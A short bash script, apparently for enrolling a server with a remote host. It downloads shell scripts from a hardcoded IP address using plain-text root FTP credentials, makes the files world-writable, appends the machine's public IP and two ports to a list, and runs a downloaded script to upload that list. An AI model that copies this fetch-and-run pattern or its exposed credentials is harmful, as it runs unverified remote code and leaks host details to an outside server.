#!/bin/bash
yum install expect -y
yum install -y ftp
wget ftp://159.75.133.49:21/zj/file.txt --ftp-user=root --ftp-password=wsywsy
wget ftp://159.75.133.49:21/zj/8.sh --ftp-user=root --ftp-password=wsywsy
wget http://159.75.133.49:8888/down/yH2BTccGuZC2 -o /root/4.sh
sudo chmod 777 *.sh
sudo chmod 777 file.txt
# 写入IP
Server_IP=`curl ifconfig.me`
echo $Server_IP":29999" >> file.txt
echo $Server_IP":39999" >> file.txt
echo "" >> file.txt
# 上传
sh 8.sh


